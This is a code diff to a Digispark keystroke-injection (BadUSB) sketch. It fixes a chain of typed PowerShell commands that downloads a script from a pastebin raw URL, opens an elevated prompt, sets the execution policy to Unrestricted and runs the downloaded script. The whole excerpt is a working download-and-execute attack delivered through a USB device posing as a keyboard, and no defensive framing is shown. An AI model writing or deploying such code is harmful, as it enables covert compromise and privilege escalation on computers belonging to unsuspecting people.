@@ -30,8 +30,8 @@ void loop() {
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
   // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
-  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$client.DownloadFile(\"https://pastebin.com/raw/GaccCRrz\", $path)");
+  DigiKeyboard.delay(4000);
 
   DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
   DigiKeyboard.delay(750);
@@ -40,7 +40,7 @@ void loop() {
   DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
   DigiKeyboard.delay(750);
 
-  DigiKeyboard.print("powershell.exe -File %USERPROFILE%\\script2.ps1");
+  DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
 
   digitalWrite(1, LOW);
   for(;;){}
